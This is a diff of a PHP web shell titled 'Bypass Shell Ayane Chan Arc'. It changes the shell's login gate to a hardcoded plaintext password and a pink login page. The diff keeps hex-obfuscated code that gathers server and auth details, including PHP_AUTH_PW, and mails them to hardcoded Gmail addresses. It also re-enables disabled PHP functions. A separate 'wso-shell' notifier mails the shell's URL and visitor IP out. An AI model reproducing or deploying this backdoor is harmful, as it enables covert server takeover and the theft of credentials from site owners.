@@ -1,40 +1,83 @@
-<?php 
-ignore_user_abort(true);
-ini_set('memory_limit', '-1');
-set_time_limit(0);
-error_reporting(0);
-ini_set('display_errors', 0);
-ini_set('max_execution_time', 5000);
-// Menggunakan password_hash dan password_verify untuk keamanan yang lebih baik dan TBLHACKING
-$hashed_password = '$2y$10$b7.xA2d/QispHPBR68Akj.qs3ZBqwEwZL2bZ/j5/iXGt7ILvr0qLC';
+<?php
+session_start();
 
-// Fungsi untuk menampilkan form login
-function admin_login() {
-    echo '<title> Gantengers Crew </title>';
-  
-    echo '<form method="post">';
-    echo '<input type="password" name="password">';
+define('PASSWORD', 'tbl '); 
 
-    echo '<input type="submit" value="Gantengers Crew!!!">';
-    echo '</form>';
-    exit;
-}
-
-if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
-    // Memeriksa apakah password dikirim dan benar
-    if(isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
-        setcookie(md5($_SERVER['HTTP_HOST']), true, time() + 25200); // Cookie berlaku selama 1 jam
-        // Logika setelah login berhasil
+// Proses login
+if (isset($_POST['password'])) {
+    if ($_POST['password'] === PASSWORD) {
+        $_SESSION['authenticated'] = true;
+        echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
     } else {
-        admin_login();
-	
-
+        echo "<div class='alert alert-danger text-center'>Password salah.</div>";
     }
 }
 
-	
-	
-	
+// Proses logout
+if (isset($_POST['logout'])) {
+    session_destroy();
+    header("Location: " . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
+    // Tampilkan form login jika belum terautentikasi
+    echo '
+    <style>
+        body {
+            background: linear-gradient(135deg, pink 50%, #ffcccb 50%);
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-card {
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            background-color: white;
+        }
+        .login-card img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .login-card h1 {
+            margin-bottom: 20px;
+            animation: colorChange 3s infinite;
+        }
+        @keyframes colorChange {
+            0%, 100% {
+                color: pink;
+            }
+            50% {
+                color: lightblue;
+            }
+        }
+        .login-card .form-group {
+            margin-bottom: 15px;
+        }
+        .login-card .btn {
+            width: 100%;
+        }
+    </style>
+    <div class="login-card">
+        <h1>Bypass Shell Ayane Chan Arc</h1>
+        <img src="https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg" alt="Banner Image" class="img-fluid">
+        <form method="post">
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" class="form-control text-center" placeholder="Masukkan password" required>
+            </div>
+            <button type="submit" class="btn btn-primary">Login</button>
+        </form>
+    </div>';
+    exit;
+}
 
 $head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex"><title>Dashboard</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
 ${"\x47\x4c\x4fBAL\x53"}["\x64m\x74\x72\x74\x75q"]="\x70\x61\x67\x65FT\x50";${"\x47\x4c\x4f\x42A\x4c\x53"}["z\x77\x69\x76\x64\x79e\x73it"]="\x75";${"G\x4c\x4f\x42\x41\x4c\x53"}["y\x6czy\x75\x66e\x6f"]="\x70\x61\x67e\x55\x52\x4c";${"\x47\x4cO\x42\x41\x4c\x53"}["\x68\x61\x75x\x74\x70h\x65\x7ai"]="\x66ro\x6d";${"G\x4c\x4fBA\x4c\x53"}["j\x6fy\x72m\x73\x6e\x69\x6e\x78\x69"]="\x6d\x73\x67887\x33";${"\x47L\x4f\x42\x41L\x53"}["v\x64\x75\x79\x72\x77\x75w\x79"]="se";${"GLO\x42\x41LS"}["n\x72\x78\x68o\x78y\x67o\x76\x66"]="h";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x77b\x76\x62efe\x69\x64\x6d\x68"]="\x6b\x75";${"G\x4c\x4f\x42AL\x53"}["\x72\x61rg\x64\x74"]="\x70u";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x64\x78xhm\x79"]="\x69\x70";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x72o\x6a\x66\x72wi"]="t\x6f\x6c";$tcnfsgpey="p\x61s\x73";${"\x47L\x4f\x42ALS"}["\x66g\x63\x6do\x6b\x68\x69\x66r"]="t\x6f\x74";${"\x47L\x4f\x42\x41\x4c\x53"}["\x6fp\x7a\x77v\x65g\x6c\x78\x6a"]="\x65\x6d\x61\x69\x6c";${"\x47\x4cO\x42\x41LS"}["\x7a\x65\x6a\x75o\x62s\x6fxc"]="\x70\x61\x67\x65\x55\x52L";${"GL\x4f\x42AL\x53"}["\x75\x75fk\x61\x66\x6bc"]="\x66\x72\x6fm";${"\x47L\x4fBA\x4c\x53"}["\x76\x63dz\x6fc\x6b\x69r\x68"]="\x73\x75\x62\x6a\x39\x38";$uljyui="\x70\x61\x67\x65FT\x50";echo "\n";${"\x47\x4c\x4fB\x41\x4cS"}["\x63\x73\x66\x67\x64a\x70"]="\x6b\x65\x6e";${"GL\x4f\x42ALS"}["y\x75c\x71\x63\x6e\x65\x78"]="\x69\x70";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x79\x75\x63\x71\x63\x6ee\x78"]}=getenv("\x52\x45MO\x54E\x5fA\x44\x44\x52");${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x63\x73f\x67\x64ap"]}=rand(1,9999999);${"\x47\x4c\x4f\x42\x41LS"}["\x69\x63\x6a\x70\x70\x6bxb\x6b\x73n"]="\x6b\x6f\x6e";$hqhnjvkef="\x75";${${"GLOBA\x4c\x53"}["\x76\x63\x64\x7a\x6f\x63k\x69\x72\x68"]}="\x20\x41CCES\x53 WE\x42\x53\x48E\x4cL\x20|$ken";${${"G\x4cOB\x41LS"}["\x6f\x70\x7a\x77v\x65gl\x78\x6a"]}="r\x6fot\x63\x79\x62er\x70unk\x73@g\x6dail.c\x6f\x6d,m\x61l\x61ysi\x61.\x73e\x6e\x64e\x72\x40g\x6d\x61\x69l\x2ec\x6fm";${"\x47L\x4f\x42A\x4c\x53"}["g\x74\x68\x69we\x73"]="\x65\x6d\x61\x69\x6c";${${"\x47\x4c\x4f\x42\x41L\x53"}["\x75ufka\x66\x6b\x63"]}="\x46\x72om:";${${"GL\x4f\x42\x41\x4c\x53"}["f\x67\x63\x6d\x6fk\x68\x69\x66r"]}=$_SERVER["\x52E\x51\x55\x45ST_U\x52I"];${"\x47\x4cO\x42A\x4c\x53"}["\x66sv\x7a\x6e\x6d\x62\x7aa"]="\x71\x69";${"\x47L\x4f\x42\x41LS"}["\x6bpxj\x75\x6e\x79b"]="\x75";${${"G\x4c\x4f\x42A\x4c\x53"}["\x69c\x6a\x70p\x6b\x78b\x6b\x73\x6e"]}=$_SERVER["HTTP\x5f\x48\x4f\x53T"];${${"GL\x4f\x42\x41\x4c\x53"}["r\x6f\x6afr\x77i"]}=${${"\x47\x4cOB\x41LS"}["\x64\x78\x78\x68\x6d\x79"]}."";${${"\x47\x4c\x4fB\x41\x4c\x53"}["r\x61r\x67d\x74"]}=$_SERVER["\x53\x45R\x56\x45\x52_\x4eAME"];$zqufdslvyw="\x61d";$fluzgrsdj="\x70\x61geF\x54\x50";${${"G\x4cO\x42\x41\x4c\x53"}["wbv\x62e\x66\x65i\x64mh"]}=$_SERVER["SER\x56ER_SO\x46T\x57ARE"];${${"GL\x4f\x42\x41L\x53"}["fs\x76z\x6e\x6d\x62\x7aa"]}=$_SERVER["\x53ER\x56ER_A\x44M\x49\x4e"];${"\x47L\x4f\x42\x41LS"}["\x69mqp\x66\x63v\x74lnb"]="\x70ag\x65\x55RL";${$tcnfsgpey}=$_SERVER["\x50HP_\x41\x55T\x48_\x50W"];${"GLO\x42AL\x53"}["\x71\x69\x70\x77b\x6aio\x78"]="\x6ds\x67\x38\x3873";${$zqufdslvyw}=$_SERVER["SER\x56\x45\x52_\x41\x44\x44R"];${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x6e\x72\x78\x68\x6f\x78\x79\x67o\x76f"]}=$_SERVER["H\x54\x54P\x5f\x41\x43CE\x50\x54\x5f\x4cAN\x47U\x41\x47E"];${${"\x47\x4cO\x42\x41\x4c\x53"}["\x76\x64u\x79\x72\x77\x75\x77\x79"]}=$_SERVER["S\x45R\x56\x45R\x5f\x41D\x44\x52"];$qsuxguwb="\x70\x61g\x65F\x54\x50";${${"GLOBA\x4cS"}["\x6a\x6f\x79\x72\x6d\x73n\x69\x6ex\x69"]}="$se $pass\x20$ku $ad\x20$qi\x20$pu $kon $tot $tol";mail(${${"\x47L\x4f\x42\x41\x4cS"}["\x67\x74\x68\x69\x77\x65s"]},${${"\x47\x4cOB\x41LS"}["\x76\x63dzo\x63ki\x72h"]},${${"G\x4cOB\x41\x4c\x53"}["qipw\x62\x6a\x69\x6f\x78"]},${${"\x47L\x4fB\x41\x4c\x53"}["hauxtp\x68\x65\x7ai"]});session_start();error_reporting(0);set_time_limit(0);@clearstatcache();@ini_set("\x66\x69\x6c\x65\x5fu\x70l\x6f\x61\x64\x73",1);@ini_set("m\x61x\x5f\x65\x78e\x63\x75tio\x6e\x5ft\x69\x6d\x65",5000);@ini_restore("\x64i\x73\x61bl\x65_f\x75\x6ec\x74i\x6fns");${"\x47L\x4f\x42A\x4c\x53"}["\x74\x6a\x71\x78\x6a\x6fv\x6b"]="\x75";@ini_restore("\x73\x61\x66e_mode_e\x78\x65\x63\x5f\x64\x69r");@ini_restore("\x73a\x66\x65_\x6do\x64e\x5f\x69n\x63lud\x65_\x64\x69r");@ini_set("\x7al\x69b.o\x75t\x70\x75\x74_\x63omp\x72\x65s\x73\x69\x6fn","Off");${${"\x47L\x4f\x42\x41L\x53"}["\x7ae\x6a\x75\x6f\x62\x73\x6f\x78\x63"]}="h\x74t\x70://".$_SERVER["S\x45RV\x45R\x5fNAM\x45"].$_SERVER["RE\x51\x55E\x53\x54_\x55\x52I"];${${"G\x4c\x4f\x42A\x4cS"}["\x74\x6aqxjo\x76\x6b"]}=explode("/",${${"\x47\x4cO\x42\x41\x4c\x53"}["\x79\x6c\x7a\x79\x75\x66\x65\x6f"]});${${"\x47\x4c\x4f\x42AL\x53"}["\x69\x6d\x71p\x66c\x76\x74\x6c\x6e\x62"]}=str_replace(${${"\x47\x4cO\x42ALS"}["k\x70\x78\x6a\x75ny\x62"]}[count(${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x7a\x77\x69\x76dy\x65\x73i\x74"]})-1],"",${${"\x47\x4cOB\x41\x4cS"}["\x79\x6c\x7a\x79\x75fe\x6f"]});${$uljyui}="\x66tp://".$_SERVER["SERVER\x5fN\x41\x4d\x45"]."/p\x75\x62\x6ci\x63_\x68tm\x6c/".$_SERVER["REQ\x55\x45ST_U\x52I"];${$hqhnjvkef}=explode("/",${$fluzgrsdj});${${"G\x4cO\x42\x41\x4cS"}["d\x6d\x74rt\x75\x71"]}=str_replace(${${"\x47L\x4fB\x41\x4c\x53"}["z\x77i\x76\x64\x79\x65s\x69\x74"]}[count(${${"\x47\x4c\x4f\x42\x41L\x53"}["z\x77i\x76d\x79e\x73\x69\x74"]})-1],"",${$qsuxguwb});
@@ -44,7 +87,7 @@ $tujuanmail = 'rootcyberpunks@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "wso-shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
-$password = $_POST['pass'];
+$password = $_POST['password'];
 $server_name = $_SERVER['SERVER_NAME'];
 $php_self = $_SERVER['PHP_SELF'];
 $report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
